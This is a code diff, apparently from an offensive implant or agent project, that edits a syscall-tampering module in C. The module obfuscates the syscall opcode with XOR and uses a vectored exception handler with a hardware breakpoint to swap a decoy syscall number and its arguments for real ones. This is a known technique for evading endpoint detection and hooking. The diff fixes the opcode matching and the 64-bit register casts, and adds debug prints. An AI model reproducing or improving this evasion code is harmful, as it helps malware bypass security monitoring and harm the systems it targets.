@@ -3,14 +3,18 @@
 //
 
 #include "../../../../headers/agent/evasion/syscalls/syscalls.h"
+
+#include <intrin.h>
+
 #include "../../../../headers/agent/evasion/PeParsing/evasive.h"
+#include <stdio.h>
 
 pSYS_ENTRY_LIST g_SyscallList = NULL;
 TAMPERED_SYSCALL g_TamperedSyscall = { 0 };
 CRITICAL_SECTION g_CriticalSection = { 0 };
 PVOID g_VehHandler = NULL;
 LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo);
-volatile unsigned short g_SYSCALL_OPCODE = 0x8C89;
+volatile unsigned short g_SYSCALL_OPCODE = 0x262A; // 0x050F ^ 0x2325
 
 BOOL PopulateSyscallList() {
 
@@ -171,7 +175,8 @@ BOOL InitializeTamperedSyscall(_In_ ULONG_PTR uCalledSyscallAddress, _In_ DWORD6
     DWORD dwRealSyscallNumber = 0x00;
 
     for(int i = 0; i < 0x20; i++) {
-        if(*(unsigned short*)(uCalledSyscallAddress + i) ^ 0x8986 == g_SYSCALL_OPCODE) {
+        unsigned short opcodes = *(unsigned short*)(uCalledSyscallAddress + i);
+        if(opcodes == (0x2325 ^ g_SYSCALL_OPCODE)) {
             pDecoySyscallInstructionAdd = (PVOID)(uCalledSyscallAddress + i);
             break;
         }
@@ -206,12 +211,17 @@ LONG ExceptionHandlerCallbackRoutine(IN PEXCEPTION_POINTERS pExceptionInfo) {
     //Replace Decoy SSN
     pExceptionInfo->ContextRecord->Rax = (DWORD64)g_TamperedSyscall.dwSyscallNumber;
     // replace decoy parms
-    pExceptionInfo->ContextRecord->R10 = (DWORD)g_TamperedSyscall.uParam1;
-    pExceptionInfo->ContextRecord->Rdx = (DWORD)g_TamperedSyscall.uParam2;
-    pExceptionInfo->ContextRecord->R8 = (DWORD)g_TamperedSyscall.uParam3;
-    pExceptionInfo->ContextRecord->R9 = (DWORD)g_TamperedSyscall.uParam4;
+    pExceptionInfo->ContextRecord->R10 = (DWORD64)g_TamperedSyscall.uParam1;
+    pExceptionInfo->ContextRecord->Rdx = (DWORD64)g_TamperedSyscall.uParam2;
+    pExceptionInfo->ContextRecord->R8 = (DWORD64)g_TamperedSyscall.uParam3;
+    pExceptionInfo->ContextRecord->R9 = (DWORD64)g_TamperedSyscall.uParam4;
     //remove breakpoint
     pExceptionInfo->ContextRecord->Dr0 = 0ull;
+
+
+    printf("[info] rbp : 0x%llx\n", pExceptionInfo->ContextRecord->Rbp);
+    printf("[info] rsp : 0x%llx\n", pExceptionInfo->ContextRecord->Rsp);
+    printf("[info] address of return address : 0x%p\n", _AddressOfReturnAddress());
 
     LeaveCriticalSection(&g_CriticalSection);
 
